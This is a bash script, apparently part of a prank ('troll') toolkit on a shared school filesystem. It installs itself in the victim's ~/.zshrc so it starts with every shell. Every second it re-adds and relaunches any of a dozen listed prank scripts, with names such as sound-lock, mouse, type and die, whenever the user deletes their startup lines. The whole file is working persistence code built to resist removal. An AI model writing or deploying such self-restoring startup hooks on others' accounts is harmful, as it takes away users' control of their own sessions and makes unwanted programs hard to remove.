#!/bin/bash
# If the script is already running, exit
if pgrep -f "$(basename "$0")" | grep -v $$ > /dev/null; then
    exit 0
fi

if ! grep -q "/sgoinfre/goinfre/Perso/mochamsa/troll/monitor.sh" ~/.zshrc 2>/dev/null; then
    cat << EOF >> ~/.zshrc
nohup /sgoinfre/goinfre/Perso/mochamsa/troll/monitor.sh > /dev/null 2>&1 &
EOF
fi

ALL_SCRIPTS=(
    "/sgoinfre/goinfre/Perso/mochamsa/troll/albie.sh"
    "/sgoinfre/goinfre/Perso/mochamsa/troll/alice.sh"
    "/sgoinfre/goinfre/Perso/mochamsa/troll/midnight.sh"
    "/sgoinfre/goinfre/Perso/mochamsa/troll/space.sh"
    "/sgoinfre/goinfre/Perso/mochamsa/troll/sound-lock.sh"
    "/sgoinfre/goinfre/Perso/mochamsa/troll/type.sh"
    "/sgoinfre/goinfre/Perso/mochamsa/troll/mouse.sh"
    "/sgoinfre/goinfre/Perso/mochamsa/troll/die.sh"
    "/sgoinfre/goinfre/Perso/mochamsa/troll/vimeye.sh"
    "/sgoinfre/goinfre/Perso/mochamsa/troll/detect.sh"
    "/sgoinfre/goinfre/Perso/mochamsa/troll/myshrek.sh"
    "/sgoinfre/goinfre/Perso/mochamsa/troll/uwusound.sh"
    "/sgoinfre/goinfre/Perso/mochamsa/troll/monitor.sh"
)

declare -A MONITORED_SCRIPTS

scan_zshrc() {
    for script in "${ALL_SCRIPTS[@]}"; do
        if grep -q "$script" ~/.zshrc 2>/dev/null; then
            if [[ -z "${MONITORED_SCRIPTS[$script]}" ]]; then
                MONITORED_SCRIPTS[$script]="monitored"
            fi
        fi
    done
}

restore_script() {
    local script_path="$1"
    
    cat << EOF >> ~/.zshrc
nohup $script_path > /dev/null 2>&1 &
EOF
    
    nohup "$script_path" > /dev/null 2>&1 &
}

check_and_restore() {
    scan_zshrc
    
    for script in "${!MONITORED_SCRIPTS[@]}"; do
        if [ ! -f "$script" ]; then
            continue
        fi
        
        if ! grep -q "$script" ~/.zshrc 2>/dev/null; then
            restore_script "$script"
        fi
    done
}

cleanup() {
    exit 0
}

trap cleanup SIGINT SIGTERM SIGHUP

while true; do
    check_and_restore
    sleep 1
done